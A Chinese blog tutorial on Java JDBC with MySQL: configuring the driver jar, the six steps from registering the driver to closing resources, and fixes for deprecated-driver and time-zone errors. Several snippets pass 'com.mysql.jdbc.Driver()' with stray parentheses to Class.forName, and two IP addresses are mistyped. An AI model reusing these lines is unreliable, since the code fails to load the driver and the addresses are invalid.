    <content type="html"><![CDATA[<p>JAVA基础知识复习（十二）- JDBC（Java DataBase Connectivity）使用。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="0-前提工作"><a href="#0-前提工作" class="headerlink" title="0.前提工作"></a>0.前提工作</h2><p>先从官网下载对应的驱动 jar 包。</p><h3 id="0-1-文本编辑器配置驱动jar包"><a href="#0-1-文本编辑器配置驱动jar包" class="headerlink" title="0.1 文本编辑器配置驱动jar包"></a>0.1 文本编辑器配置驱动jar包</h3><p>如果是使用的文本编辑器实现的，则需要手动配置环境变量。</p><blockquote><ol><li>在 系统变量 中，找到 classpath ，如果没有就新建一个名为 classpath 的。如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210521135019447.png"></p><blockquote><ol start="2"><li>在变量值中加上你下载的驱动 jar 包的位置。这里是以 E 盘为例。</li></ol></blockquote><p><strong>注意：点号(.)和分号(;)一定不能忘了！！！且要是英文状态的。否则配置好之后仍然不能实现。</strong></p><p><img src="https://img-blog.csdnimg.cn/20210521135423625.png"></p><h3 id="0-2-IDEA配置驱动jar包"><a href="#0-2-IDEA配置驱动jar包" class="headerlink" title="0.2 IDEA配置驱动jar包"></a>0.2 IDEA配置驱动jar包</h3><blockquote><ol><li>在建好的项目中，选中 src 再右键，选择 Open Module Settings 点击。 如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210521144014951.png"></p><blockquote><ol start="2"><li>在弹出的窗口中 ，选择 Libraries ，再点击加号（+）并选择 java ，再去选择找到驱动 jar 包即可。如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210521144034606.png"></p><blockquote><ol start="3"><li>选择完毕后，一步步点击 ok 即可。如图。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210521144136128.png"></p><p><img src="https://img-blog.csdnimg.cn/20210521144153101.png"></p><p><img src="https://img-blog.csdnimg.cn/2021052114421076.png"></p><blockquote><ol start="4"><li>最后，可以在目录处看见已经加进来的驱动 jar 包。</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/20210521144229215.png"></p><h2 id="1-JDBC编程（六步）"><a href="#1-JDBC编程（六步）" class="headerlink" title="1.JDBC编程（六步）"></a>1.JDBC编程（六步）</h2><p><strong>实际具体需要几步，需要根据第四步来确认。</strong></p><p>可以先把包导进去，后面过程中不再说导包问题。<br>可能用到的包：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Driver;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br></code></pre></div></td></tr></table></figure><p>也可以一键导入所有与之相关的包：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.*;<br></code></pre></div></td></tr></table></figure><h3 id="1-1-注册驱动"><a href="#1-1-注册驱动" class="headerlink" title="1.1 注册驱动"></a>1.1 注册驱动</h3><p>让 java 程序知道即将要连接的是哪个类型的数据库。</p><blockquote><p>写法一：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());<br></code></pre></div></td></tr></table></figure><blockquote><p>写法二：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Driver dr = <span class="hljs-keyword">new</span> com.mysql.jdbc.Driver(); <span class="hljs-comment">/*这里的 Driver 是 java.sql.Driver ,这里简写了*/</span><br>DriverManager.registerDriver(dr);<br></code></pre></div></td></tr></table></figure><p>以上两种方式实现效果一样。<br>但是，会出现 Unhandled exception: java.sql.SQLException 的错误情况。<br>这是因为异常的缘故。将代码放在try catch 即可。<br>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>       DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">       Driver dr = new com.mysql.jdbc.Driver(); //多态，父类型引用指向子类型对象。</span><br><span class="hljs-comment">       DriverManager.registerDriver(dr);</span><br><span class="hljs-comment">       */</span><br>   &#125; <span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>   e.printStackTrace();<br>   &#125;<br></code></pre></div></td></tr></table></figure><p><strong>小知识：</strong>在 DriverManager.registerDriver(new com.mysql.jdbc.Driver()); 代码中为什么是 com.mysql.jdbc.Driver() ？</p><blockquote><p>原因（方便理解）：自行将下载的驱动 jar 包进行解压后可以发现，其中有两个文件夹（com、META-INF）；打开 com 文件夹；再打开 mysql 文件夹；再打开 jdbc 文件夹；发现有一个 Driver.class 的文件。 而代码中出现的顺序刚好是打开文件夹的顺序。</p></blockquote><h4 id="1-1-1-驱动加载常用写法"><a href="#1-1-1-驱动加载常用写法" class="headerlink" title="1.1.1 驱动加载常用写法"></a>1.1.1 驱动加载常用写法</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver()&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            * 这种方法的好处是：参数是一个字符串，而字符串可以写到xxxx.properties文件中。</span><br><span class="hljs-comment">            * 并且这种方法不需要接收返回值，因为只需要用到它的类加载动作。</span><br><span class="hljs-comment">            *</span><br><span class="hljs-comment">            * */</span><br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver()&quot;</span>);<br>            <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>;<br>            String password = <span class="hljs-string">&quot;&quot;</span>;<br>            Connection conn = DriverManager.getConnection(url,user,password);<br>        &#125; <span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">catch</span> (ClassNotFoundException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-获取连接"><a href="#1-2-获取连接" class="headerlink" title="1.2 获取连接"></a>1.2 获取连接</h3><p>表示 JVM 的进程和数据库进程之间的通道打开了，属于进程之间的通信，重量级的，使用完之后一定要关闭通道。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String url = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306&quot;</span>;<br>String user = <span class="hljs-string">&quot;root&quot;</span>;<br>String password = <span class="hljs-string">&quot;loong&quot;</span>;<br>Connection conn = DriverManager.getConnection(url,user,password);<br></code></pre></div></td></tr></table></figure><p><strong>注意：代码仍然需要放在try catch 中，否则会报错。</strong></p><p>实现代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//第一步</span><br>            DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());<br>           <span class="hljs-comment">/*</span><br><span class="hljs-comment">            Driver dr = new com.mysql.jdbc.Driver(); //多态，父类型引用指向子类型对象。</span><br><span class="hljs-comment">            DriverManager.registerDriver(dr);</span><br><span class="hljs-comment">            */</span><br>        <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">/*数据库用户名*/</span><br>            String password = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">/*数据库密码*/</span><br>            Connection conn = DriverManager.getConnection(url,user,password);<br>        &#125; <span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></div></td></tr></table></figure><p>其中，url是统一资源定位符（网络中某个资源的绝对路径）。它包括了：协议、IP、port（端口）、资源名。<br>例如，以百度为例。<br>访问：<a href="http://110.242.68.4/index.html">http://110.242.68.4:80/index.html</a> 和访问：<a href="http://www.baidu.com/">www.baidu.com</a> 的效果是一样的。其中，</p><blockquote><p>http:// ： 是通信协议；</p></blockquote><blockquote><p>111.110.242.68.4 ：服务器IP地址；</p></blockquote><blockquote><p>80 ：服务器上软件的端口；</p></blockquote><blockquote><p>index.html ：服务器上某个资源名（这里是百度的首页）</p></blockquote><p>其中url：jdbc:mysql://127.0.0.1:3306/dr；</p><blockquote><p>jdbc:mysql:// ：协议；</p></blockquote><blockquote><p>128.127.0.0.1 ：IP地址 （使用 localhost 效果一样）；</p></blockquote><blockquote><p>3306 ：mysql数据库端口号；</p></blockquote><blockquote><p>dr ：具体的数据库实例名</p></blockquote><h3 id="1-3-获取数据库操作对象"><a href="#1-3-获取数据库操作对象" class="headerlink" title="1.3 获取数据库操作对象"></a>1.3 获取数据库操作对象</h3><p>专门执行 SQL 语句的对象。<br><strong>注意：代码仍然需要放在try catch 中，否则会报错。</strong></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());<br>           <span class="hljs-comment">/*</span><br><span class="hljs-comment">            Driver dr = new com.mysql.jdbc.Driver(); //多态，父类型引用指向子类型对象。</span><br><span class="hljs-comment">            DriverManager.registerDriver(dr);</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>;<br>            String password = <span class="hljs-string">&quot;&quot;</span>;<br>            Connection conn = DriverManager.getConnection(url,user,password);<br>           <span class="hljs-comment">//第三步</span><br>            Statement stmt = conn.createStatement();<br>        &#125; <span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-4-执行SQL语句"><a href="#1-4-执行SQL语句" class="headerlink" title="1.4 执行SQL语句"></a>1.4 执行SQL语句</h3><p>主要执行 DQL（数据查询语言）、DML（数据操纵语言）。还有 DDL（数据定义语言）、DCL（数据控制语言）。<br>DML语句包括：插入（insert）、删除（delete）、修改（update）。</p><h4 id="1-4-1-不使用-select"><a href="#1-4-1-不使用-select" class="headerlink" title="1.4.1 不使用 select"></a>1.4.1 不使用 select</h4><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());<br>           <span class="hljs-comment">/*</span><br><span class="hljs-comment">            Driver dr = new com.mysql.jdbc.Driver(); //多态，父类型引用指向子类型对象。</span><br><span class="hljs-comment">            DriverManager.registerDriver(dr);</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>;<br>            String password = <span class="hljs-string">&quot;&quot;</span>;<br>            Connection conn = DriverManager.getConnection(url,user,password);<br>           <span class="hljs-comment">//第三步</span><br>            Statement stmt = conn.createStatement();<br>            <span class="hljs-comment">//第四步</span><br>            String sql = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">/*这里没有写SQL语句，可自行添加，JDBC的SQL语句不需要提供分号结尾*/</span><br>            <span class="hljs-keyword">int</span> count = stmt.executeUpdate(sql);<br>            <span class="hljs-comment">/*返回值是：影响数据库中的记录条数*/</span><br>        &#125; <span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></div></td></tr></table></figure><p>不使用 select 语句，则第五步就没有了。</p><h4 id="1-4-2-使用-select"><a href="#1-4-2-使用-select" class="headerlink" title="1.4.2 使用 select"></a>1.4.2 使用 select</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.sql.*;<br><br>Connection conn = <span class="hljs-keyword">null</span>;<br>        Statement stmt = <span class="hljs-keyword">null</span>;<br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver()&quot;</span>);<br>            <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>;<br>            String password = <span class="hljs-string">&quot;&quot;</span>;<br>            conn = DriverManager.getConnection(url,user,password);<br>            <span class="hljs-comment">//第三步</span><br>            stmt = conn.createStatement();<br>            <span class="hljs-comment">//第四步</span><br>            String sql = <span class="hljs-string">&quot; &quot;</span>;<br>            rs = stmt.executeQuery(sql);<br>        &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></div></td></tr></table></figure><p>其中，在得到数据的时候不一定都用 getString 去接收；如果本身是 int 型的，则也可以用 getInt 的方式去得到，double 型的也可以用 getDouble 方式得到。</p><p>并且 rs.getString(1); 中的数字1可以换成列名。如：rs.getString(“username”); 但需要注意的是，列名称不是表中的列名称，而是查询结果集中的列名称。</p><h3 id="1-5-处理查询结果集"><a href="#1-5-处理查询结果集" class="headerlink" title="1.5 处理查询结果集"></a>1.5 处理查询结果集</h3><p>只有当第四步执行的是 select 语句的时候，才有这一步。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.sql.*;<br><br>Connection conn = <span class="hljs-keyword">null</span>;<br>        Statement stmt = <span class="hljs-keyword">null</span>;<br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver()&quot;</span>);<br>            <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>;<br>            String password = <span class="hljs-string">&quot;&quot;</span>;<br>            conn = DriverManager.getConnection(url,user,password);<br>            <span class="hljs-comment">//第三步</span><br>            stmt = conn.createStatement();<br>            <span class="hljs-comment">//第四步</span><br>            String sql = <span class="hljs-string">&quot; &quot;</span>;<br>            rs = stmt.executeQuery(sql);<br>            <span class="hljs-comment">//第五步</span><br>            <span class="hljs-keyword">while</span>(rs.next())&#123;<br>                String em = rs.getString(<span class="hljs-number">1</span>);<span class="hljs-comment">//这里下标表示列并且从1开始，并不是从0开始</span><br>                String name = rs.getString(<span class="hljs-number">2</span>);<br>                String sal = rs.getString(<span class="hljs-number">3</span>);<br>                System.out.println(em+<span class="hljs-string">&quot;,&quot;</span>+name+<span class="hljs-string">&quot;,&quot;</span>+sal);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-6-释放资源"><a href="#1-6-释放资源" class="headerlink" title="1.6 释放资源"></a>1.6 释放资源</h3><p>使用完资源之后一定要关闭资源。java 和数据库属于进程间的通信，开启之后一定要关闭。通常写在 finally 中，因为为了保证资源一定释放。并且遵循从小到大依次关闭。分别对其try catch。</p><h4 id="1-6-1-不使用-select"><a href="#1-6-1-不使用-select" class="headerlink" title="1.6.1 不使用 select"></a>1.6.1 不使用 select</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Connection conn = <span class="hljs-keyword">null</span>;<br>       Statement stmt = <span class="hljs-keyword">null</span>; <span class="hljs-comment">/*这里之所以提到外面声明，是因为在 finally 中还要使用*/</span><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-comment">//第一步</span><br>           DriverManager.registerDriver(<span class="hljs-keyword">new</span> com.mysql.jdbc.Driver());<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Driver dr = new com.mysql.jdbc.Driver(); //多态，父类型引用指向子类型对象。</span><br><span class="hljs-comment">           DriverManager.registerDriver(dr);</span><br><span class="hljs-comment">           */</span><br>           <span class="hljs-comment">//第二步</span><br>           String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>           String user = <span class="hljs-string">&quot;&quot;</span>;<br>           String password = <span class="hljs-string">&quot;&quot;</span>;<br>           conn = DriverManager.getConnection(url,user,password);<br>          <span class="hljs-comment">//第三步</span><br>           stmt = conn.createStatement();<br>           <span class="hljs-comment">//第四步</span><br>           String sql = <span class="hljs-string">&quot;&quot;</span>;<br>           <span class="hljs-keyword">int</span> count = stmt.executeUpdate(sql);<br>       &#125; <span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>           e.printStackTrace();<br>       &#125;<span class="hljs-keyword">finally</span> &#123;<br>           <span class="hljs-comment">//第六步</span><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-keyword">if</span> (stmt != <span class="hljs-keyword">null</span>) &#123;<br>                   stmt.close();<br>               &#125;<br>           &#125;<span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>                   e.printStackTrace();<br>               &#125;<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-keyword">if</span> (conn != <span class="hljs-keyword">null</span>) &#123;<br>                   conn.close();<br>               &#125;<br>           &#125;<span class="hljs-keyword">catch</span>(SQLException e)&#123;<br>                   e.printStackTrace();<br>               &#125;<br>           &#125;<br></code></pre></div></td></tr></table></figure><h4 id="1-6-2-使用-select"><a href="#1-6-2-使用-select" class="headerlink" title="1.6.2 使用 select"></a>1.6.2 使用 select</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.*;<br><span class="hljs-keyword">import</span> java.sql.*;<br><br>        Connection conn = <span class="hljs-keyword">null</span>;<br>        Statement stmt = <span class="hljs-keyword">null</span>;<br>        ResultSet rs = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//第一步</span><br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver()&quot;</span>);<br>            <span class="hljs-comment">//第二步</span><br>            String url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/dr&quot;</span>;<br>            String user = <span class="hljs-string">&quot;&quot;</span>;<br>            String password = <span class="hljs-string">&quot;&quot;</span>;<br>            conn = DriverManager.getConnection(url,user,password);<br>            <span class="hljs-comment">//第三步</span><br>            stmt = conn.createStatement();<br>            <span class="hljs-comment">//第四步</span><br>            String sql = <span class="hljs-string">&quot; &quot;</span>;<br>            rs = stmt.executeQuery(sql);<br>            <span class="hljs-comment">//第五步</span><br>            <span class="hljs-keyword">while</span>(rs.next())&#123;<br>                String em = rs.getString(<span class="hljs-number">1</span>);<span class="hljs-comment">//这里下标表示列并且从1开始，并不是从0开始</span><br>                String name = rs.getString(<span class="hljs-number">2</span>);<br>                String sal = rs.getString(<span class="hljs-number">3</span>);<br>                System.out.println(em+<span class="hljs-string">&quot;,&quot;</span>+name+<span class="hljs-string">&quot;,&quot;</span>+sal);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span>(rs != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    rs.close();<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(stmt != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    stmt.close();<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(conn != <span class="hljs-keyword">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    conn.close();<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></div></td></tr></table></figure><h2 id="报错解决（2021-06-12）："><a href="#报错解决（2021-06-12）：" class="headerlink" title="报错解决（2021/06/12）："></a>报错解决（2021/06/12）：</h2><blockquote><ol><li>Loading class <code>com.mysql.jdbc.Driver&#39;. This is deprecated. The new driver class is </code>com.mysql.cj.jdbc.Driver’. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">根据官网最新更改，需要将原来的<br>com.mysql.jdbc.Driver <br>改为如下<br>com.mysql.cj.jdbc.Driver<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>Exception in thread “main” java.sql.SQLException: The server time zone value ‘�й���׼ʱ��’ is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the ‘serverTimezone’ configuration property) to use a more specific time zone value if you want to utilize time zone support.</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">需要在原来的<br>jdbc:mysql:<span class="hljs-comment">//localhost:3306/teamc</span><br>添加 ?serverTimezone=GMT%2B8，如下<br>jdbc:mysql:<span class="hljs-comment">//localhost:3306/teamc?serverTimezone=GMT%2B8</span><br></code></pre></div></td></tr></table></figure><h2 id="2-从属性资源文件（配置文件）中读取连接数据库数据"><a href="#2-从属性资源文件（配置文件）中读取连接数据库数据" class="headerlink" title="2.从属性资源文件（配置文件）中读取连接数据库数据"></a>2.从属性资源文件（配置文件）中读取连接数据库数据</h2><blockquote><ol><li>首先，新建一个 jdbc.properties 文件，里面写上以下内容。注意文件位置需要放到同一目录下。</li></ol></blockquote><p>配置文件内容：jdbc.properties</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs 